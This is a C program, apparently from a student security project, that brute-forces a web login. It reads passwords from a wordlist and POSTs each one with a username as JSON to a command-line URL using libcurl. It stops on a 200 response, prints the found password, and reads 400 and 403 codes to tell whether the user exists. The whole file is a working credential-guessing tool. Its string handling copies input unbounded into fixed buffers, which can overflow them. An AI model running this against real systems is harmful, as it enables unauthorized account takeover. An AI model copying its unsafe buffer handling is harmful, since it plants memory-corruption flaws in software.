#include <stdio.h>
#include <curl/curl.h>
#include <string.h>
 
int main(int argc, char const **argv)
{
  FILE *dictionary;
  char password[100];
  char username[100];
  strcpy (username, argv[2]);
  int found = 0;
  int counter = 0;
  int rescode = -1;
  char filepath[100] = "/home/spellbreaker/SecurityProject/wordlist.txt";
  dictionary = fopen(filepath, "r");

  CURL *curl;
  CURLcode res;
 
  /* In windows, this will init the winsock stuff */
  curl_global_init(CURL_GLOBAL_ALL);
 
  /* get a curl handle */
  curl = curl_easy_init();

  while (fgets(password, sizeof(password), dictionary) != NULL)
  {
    if(curl) {

      int len_str = strlen(password) - 1;
      //int len_userinput = strlen(user_input) - 1;
      if(password[len_str] == '\n') password[len_str] = 0;

      printf("current word %s ", password);
      

      /* First set the URL that is about to receive our POST. This URL can
        just as well be a https:// URL if that is what should receive the
        data. */
      //url = "http://localhost:3000/users/login"

      curl_easy_setopt(curl, CURLOPT_URL, argv[1]);
      
      //Set the header, the header content may be different
      struct curl_slist* headerlist = NULL; 
      headerlist = curl_slist_append(headerlist, "Content-Type:application/json");
      curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headerlist);  
    
      /* Now specify the JSon POST data */
      char post_data[100] = "{\"name\" : \"";
      strcat(post_data,username);
      char mid[20] = "\", \"password\" : \"";
      strcat(post_data,mid);
      char tail[10] = "\"}";
      strcat(post_data,password);
      strcat(post_data,tail);

      curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
  
      /* Perform the request, res will get the return code */
      // print response
      printf("  response: ");  
      res = curl_easy_perform(curl);
      
      
      if(res == CURLE_OK) {
      
      int response_code;
      curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
      rescode = response_code;
      if( response_code == 200) {
        printf(", response code: %d\n",response_code);
        found++;
        /* always cleanup */
        curl_easy_cleanup(curl);
        break;
      }
      else printf(", response code: %d\n",response_code);
    }
      /* Check for errors */
      if(res != CURLE_OK)
        fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));
      counter++;
     
    }
  }
  curl_global_cleanup();
  if(found == 0) {
    if( rescode == 403) printf("\nLogin unsuccessful after all %d attempts, password not found for user %s.\n",counter,username);
    else if ( rescode == 400) printf("\nLogin unsuccessful after all %d attempts, user %s not found.\n",counter,username);
    else printf("Network Error, please try again.");
  }
  
  
  else printf("\nLogin Success after %d attempts!For User %s, Password was %s.",counter,username, password);
  fclose(dictionary);

  return 0;
}